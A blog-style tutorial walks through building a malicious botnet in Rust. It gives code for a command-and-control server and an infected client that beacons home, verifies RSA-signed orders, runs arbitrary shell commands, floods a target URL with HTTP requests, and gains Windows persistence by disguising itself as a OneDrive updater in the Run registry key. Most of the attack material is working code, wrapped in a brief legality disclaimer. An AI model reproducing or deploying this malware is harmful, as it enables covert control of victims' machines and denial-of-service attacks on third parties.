---
layout: post
title: "Building a Botnet in Rust"
date: 2025-2-20 12:00.00 -0600
categories: cybersecurity
---

In this fun and informational guide, I will show and guide you through some of the basic prinicpals of building your own botnet! I had this idea a while ago and now that
my Rust skills are better-than-none, I feel confident in my ability to make a cool project like this. Like always, using this or software like this on machines that are not yours (or on targets that are not yours, as you will see later) is completely illegal! My goal is to have fun, so don't be a loser and ruin it for me.

# The Basics

A botnet, if you didn't know, is really just a network of computers controlled by some other computer/computers. This network can be used for many things, but in this article we will design
a classic malicious botnet to run commands on victim machines (think DDoS, Bitcoin mining, etc).
In this tutorial, I will create a botnet with a really easy server/client model, where every infected machine reports to one central server for commands. Sounds easy enough, right?

> All the code in this tutorial assumes that you are semi-competent at Rust. There is nothing crazy or too out there, but you should be familiar with the Tokio RunTime and Async.

# Getting a Connection

TCP or UDP is the big question when it comes to networking. I prefer TCP over UDP for these applications for several reasons, and it typically has to do with the client. Some operating systems and configurations require special firewall permissions to get a UDP socket, while acting as the client in a TCP connection does not require any special configuration. This means that an infected machine can easily get a connection back to our evil host!

We will start with some work on the host machine, creating a TcpListener to open up a socket and start listening for connections.

{% highlight rust %}

// Keep in mind, we are using the tokio runtime here, so get your tokio imports down.
use std::error::Error;
use tokio::net::{TcpListener, TcpStream};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
let listener = TcpListener::bind("0.0.0.0:8080").await? // Get a TcpListener on port 8080

    loop {
        let (socket, _) = listener.accept().await?;

        tokio::spawn(async move{
            handle_conn(socket).await;
        });
    }

}

{% endhighlight %}

Notice a few quick things here: we have a function to handle our connection, and we ignoring something when we destructure into socket. We are ignoring the peer SockAddr.

> For those unfamiliar with Tokio or Rust networking, this creates a new task in parallel for every new connection.

Now, let's make a function to handle a TcpStream. We will be using 1024 byte buffers for messages between the server and client. This stipulation is important for later when we get to control server authentication.

{% highlight rust %}
async fn handle_conn(mut stream: TcpStream) {
    let (mut reader, mut writer) = stream.split();

    let mut buf = vec![0u8; 1024];

    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
    // Remember, this function is being ran in a tokio task.
    // When a pask panic!s, the task just ends and causes no issues.
    // So we don't worry about good error handling that much.

    println!("Recieved from client: {}", String::from_utf8_lossy(&buf[..]));

    // Now a little bit of work to ensure that our message is always 1024 bytes.
    // The message being sent, the command, will be set as a command line argument.
    // So that we can easily deploy an action with just notbotcontrol "do whatever" in the terminal.

    // Sets all bytes in buf to 0 again
    for (index, val) in buf.iter_mut().enumerate() {
        *val = 0;
    }

    // Sets the buffer with the arg (dont worry about
    // the actual cl argument yet, we will get there later.)
    let arg = String::from("My command!");
    arg.into_bytes().iter().enumerate().for_each(|index, &val| {
        buf[index] = val;
    });

    writer.write_all(&buf[..]).await.expect("Writer Failed");

    writer.shutdown().await;

}

{% endhighlight %}

Here we have a basic TCP server set up, taking in a message and responding with its own. Perfect!

Now let's get to the client.

A feature we will for sure need in our client is the ability to continiously connect to a server. With our current model, the server is not continuously running, rather it is just responding when
up. For this, let's make a helper function to always attempt for a connection.

{% highlight rust %}
use tokio::time::{sleep, Duration};
use tokio::net::TcpStream;

const CONTROL: &str = "127.0.0.1:8080"; // Ip of control server
// We will talk about covering this trail later.

async fn get_stream() -> TcpStream {
    loop {
        match TcpStream::connect(CONTROL).await {
            Ok(s) => return s,
            Err(_) => {
                sleep(Duration::from_millis(5000)).await;
            }
        }
    }
}

{% endhighlight %}

The principal is pretty simple: if we get a stream return it, if not we sleep for 5 seconds and try again until we do get it.

Let's get a message.

{% highlight rust %}
#[tokio::main]
async fn main() {

    // Start a communication loop
    loop {
        sleep(Duration::from_millis(5000)).await;

        let mut stream = get_stream().await;
        let (mut reader, mut writer) = stream.split();

        // Every time we use a reader or writer, we need to check for an error
        // that prompts us to reconnect to the control server.

        if let Err(_) = writer.write_all(b"Hello!").await {
            let _ = writer.shutdown().await;
            continue;
        }

        let mut buf = vec![0u8; 1024];

        // Message

        let message_length = match reader.read_exact(&mut buf).await {
            Ok(n) => n,
            Err(_) => {
                let _ = writer.shutdown().await;
                continue;
            }
        };

        println!("Message from server: {}", String::from_utf8_lossy(&buf[..]));
    }
}

{% endhighlight %}

Just like that, we have communication between server and client. Before we move on, let's make a refactor to the *server* that allows for the passing of command-line arguments to the threads.

{% highlight rust %}

use std::error::Error;
use tokio::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("0.0.0.0:8080").await?; // Get a TcpListener on port 8080
    let args: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(std::env::args().collect()));

    loop {
        let (socket, _) = listener.accept().await?;
        let a = Arc::clone(&args);

        tokio::spawn(async move{
            handle_conn(socket, a).await;
        });
    }

}

async fn handle_conn(mut stream: TcpStream, args: Arc<Mutex<Vec<String>>>) {
    let (mut reader, mut writer) = stream.split();

    let mut buf = vec![0u8; 1024];
    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
    println!("Recieved from client: {}", String::from_utf8_lossy(&buf[..]));

    for (index, val) in buf.iter_mut().enumerate() {
        *val = 0;
    }

    let arg;
    {
        arg = args.lock().unwrap().get(1).expect("No Args").clone();
    }

    arg.into_bytes().iter().enumerate().for_each(|index, &val| {
        buf[index] = val;
    });

    writer.write_all(&buf[..]).await.expect("Writer Failed");

    writer.shutdown().await;

}

{% endhighlight %}

There are obviously alternatives to this solution, this is just how I am implementing this in the case that I want to use more args in the future without *always* cloning.
Do what you want for this.

# Authentication

We have a solid channel set up for communications, but how do we ensure that messages being sent to the network areactually from you?
It could be pretty bad if just anyone could tell your botnet to do something, so we need some form of authentication from the server to the client. There are some
requirements when it comes to authentication here, mainly a client should be able to verify a message is from the legitimate control server, while not being given enough information
to *impersonate* the control server.

RSA is our answer. For those completely unfamiliar, RSA is an asymmetric encyption scheme, meaning that a private key and public key cannot work interchangably. A private key (kept private) is used to encrypt and a public key is used to decrypt or vice versa. Importantly, the private key must be private because a valid public key can be generated from a private key, and the same is not true the other way around. What is my whole point? We can verify a message senders integrity if they sign a message with the private key which we know only they have.

This method of verifying sender integrity is called *signing* a message. The specifics don't matter that much to use because there is a very nice RSA crate in Rust that we can use. Let's start with the server.

> Small detail, you will need to generate a pkcs1 PEM to use here. This can be done on websites, openssl, or some script made to do this.

{% highlight rust %}

// Pretend we have all of the other stuff we have done.
// Starting at main so we can pass the private key to all
// the connection tasks.

use rsa::pkcs1v15::{SigningKey, Signature};
use rsa::RsaPrivateKey;
use rsa::signature::{RandomizedSigner, SignatureEncoding, Verifier};
use rsa::sha2::{Digest, Sha256};
use rsa::pkcs1::DecodeRsaPrivateKey;
use rand; // HUGE IMPORTANT NOTE! You need rand version 0.8.0
          // For this to work.

const PRIVATE_PEM: &str = "Key";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("0.0.0.0:8080").await?; // Get a TcpListener on port 8080
    let args: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(std::env::args().collect()));

    let private_key = RsaPrivateKey::from_pkcs1_pem(PRIVATE_PEM).expect("Could not get private key");
    let signing_key: Arc<Mutex<SigningKey<Sha256>>> = Arc::new(Mutex::new(SigningKey::<Sha256>::new(private_key)));

    loop {
        let (socket, _) = listener.accept().await?;
        let a = Arc::clone(&args);
        let s = Arc::clone(&signing_key);
        tokio::spawn(async move{
            handle_conn(socket, a, s).await;
        });
    }

}

async fn handle_conn(mut stream: TcpStream, args: Arc<Mutex<Vec<String>>>, signing_key: Arc<Mutex<SigningKey<Sha256>>>) {
    let (mut reader, mut writer) = stream.split();

    let mut buf = vec![0u8; 1024];
    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
    println!("Recieved from client: {}", String::from_utf8_lossy(&buf[..]));

    for (index, val) in buf.iter_mut().enumerate() {
        *val = 0;
    }

    let arg;
    {
        arg = args.lock().unwrap().get(1).expect("No Args").clone();
    }

    arg.into_bytes().iter().enumerate().for_each(|index, &val| {
        buf[index] = val;
    });
    
    let signed_message;
    {
        let signing_key = signing_key.lock().unwrap();
        let mut rng = rand::thread_rng();
        signed_message = signing_key.sign_with_rng(&mut rng, &buf[..]).to_bytes();
    }

    writer.write_all(&buf[..]).await.expect("Writer Failed");
    writer.write_all(&signed_message[..]).await.expect("Writer Failed");

    writer.shutdown().await;

}

{% endhighlight %}

If you're observant, you might now understand why it's a good idea to set a fixed amount of bytes to be sent over the wire. Because a socket really just acts like a file,
a single call to read on the client could read the message **AND** the signature! This would of course cause problems. With our current design, we know that the clear-text is 1024 bytes
and the signature is 256 bytes (a feature of hashing with Sha256), stopping this annoying bug.

Let's verify the message on the client.

{% highlight rust %}

// Everything else is the same, added changes.

use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::pkcs1v15::{Signature, VerifyingKey};
use rsa::sha2::Sha256;
use rsa::signature::Verifier;
use rsa::RsaPublicKey;

const PUBLIC_PEM: &str = "Key";

#[tokio::main]
async fn main() {

    let public_key = RsaPublicKey::from_pkcs1_pem(PUBLIC_PEM).unwrap();
    let verify_key = VerifyingKey::<Sha256>::new(public_key);

    loop {
        sleep(Duration::from_millis(5000)).await;

        let mut stream = get_stream().await;
        let (mut reader, mut writer) = stream.split();

        if let Err(_) = writer.write_all(b"Hello!").await {
            let _ = writer.shutdown().await;
            continue;
        }

        let mut buf = vec![0u8; 1024];

        // Message

        let message_length = match reader.read_exact(&mut buf).await {
            Ok(n) => n,
            Err(_) => {
                let _ = writer.shutdown().await;
                continue;
            }
        };

        // Signed Message

        let mut signature_buf = vec![0u8; 256];

        if let Err(_) = reader.read(&mut signature_buf).await {
            let _ = writer.shutdown().await;
        }

        // Get Signature struct
        let signature =
            Signature::try_from(&signature_buf[..]).expect("Failed to get signature from bytes"); // Important that this buf is 256 bytes!

        // Compare hashes!
        if let Err(e) = verify_key.verify(&buf[..message_length], &signature) {
            eprintln!("{}", e);
            continue;
        }

        let command = match String::from_utf8(buf) {
            Ok(c) => c,
            Err(_) => continue,
        };

        let command = command.trim_matches(char::from(0)); // Our final message, assuming it was validated!
    }
}

{% endhighlight %}

> When I first started making this, I had huge problems with signing because I was signing
empty bytes and then verifying against a message without those empty bytes at the end. If you try something different
and get verification errors, make sure you are trying to verify the exact same bytes.

> You are probably noticing how messy this main function is getting. Feel free to clean it up, but this will be the last of the clutter.
Executing commands will be delegated to its own function and the commands themselves will be functions in a seperate module.

# Executing Commands

If you have your own ideas for this, this is where you can drop off. You have a system for distributing commands as a string to your clients, go wild. If you want the way I'm doing this,
stick around. Also, everything from now on will be focused on the client. Make the server as fancy as you want but that's where I'm stopping for now.

Let's make a function to handle a command.

{% highlight rust %}

pub mod commands;

async fn handle_command(command: &str) {
    let (command, args) = match command.split_once(" ") {
        Some((c, a)) => (c, a),
        None => (&command[..], ""),
    };

    // I keep the args as a string slice so that I can choose to use custom syntax for commands later
    // Do what you want here

    match command {
        "cmd" => {
            println!("Command running!");
            if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .args(["/C", args])
                    .spawn()
                    .expect("Command err");
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(args)
                    .spawn()
                    .expect("Command err");
            }
        }
        "httpddos" => {
            let mut args = args.split(" ");

            let url = match args.next() {
                Some(u) => u.to_string(),
                None => return, // need url
            };

            let duration = match args.next() {
                Some(d) => Duration::from_secs(d.parse().unwrap_or(300)),
                None => return,
            };

            commands::ddos(url, duration).await;
        }
        &_ => (),
    }
}

{% endhighlight %}

What I'm doing here is very simple, I match the command and do what I want to with the args.

Here is the commands.rs module.

{% highlight rust %}

use reqwest;
use std::sync::{Arc, Mutex};
use tokio::time::{sleep, Duration};

pub async fn ddos(url: String, time: Duration) {
    let mut tasks = Vec::new();

    let url = Arc::new(Mutex::new(url));

    for _ in 1..100 {
        let u = Arc::clone(&url);

        let t = tokio::spawn(async move {
            let client = reqwest::Client::new();

            let url: String = { u.lock().unwrap().clone() };

            loop {
                let _ = client.get(&url).send().await;
            }
        });

        tasks.push(t);
    }

    let _ = tokio::spawn(async move {
        sleep(time).await;

        tasks.iter().for_each(|task| {
            task.abort();
        });
    });
}

{% endhighlight %}

You should now see how you can implement your own commands!

# Persistence Specifically on Windows

I tend to target Windows machines when I make these projects, and while this will compile and run and any sort of machine that Rust can compile to,
I added features that allow this to infect Windows machines and conditonal compilation. For this, I made a function to use for Windows.

{% highlight rust %}

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

async fn get_persistence() {
    if cfg!(target_os = "windows") {
        // Makes an autostart registry key
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = Path::new("Software")
            .join("Microsoft")
            .join("Windows")
            .join("CurrentVersion")
            .join("Run");
        let (key, _disp) = hkcu.create_subkey(&path).unwrap();

        let name;
        if let Some(n) = env::args().next() {
            name = n;
        } else {
            return;
        }

        let userdirs;
        if let Some(u) = UserDirs::new() {
            userdirs = u;
        } else {
            eprintln!("Failed to get userdir");
            return;
        }

        let mut newdir = userdirs.home_dir().join("onedrivedaemon");
        newdir.set_extension("exe");

        let _ = std::fs::copy(&name, &newdir);

        let os_string = newdir.into_os_string();
        if let Err(_) = key.set_value("OneDriveUpdater", &os_string) {
            return;
        }
    }
}

{% endhighlight %}

This simply copies the file to a new name in the user AppData, and then adds it to the autorun registry key. Perfect!

# Conclusion

This project is obviously far from complete! There are many edge cases and things you would want to implement for an actual botnet! However, this is a solid base. Things I would target next
would be efficiency, server detection evasion, and probably something more I'm not thinking of.

Be safe!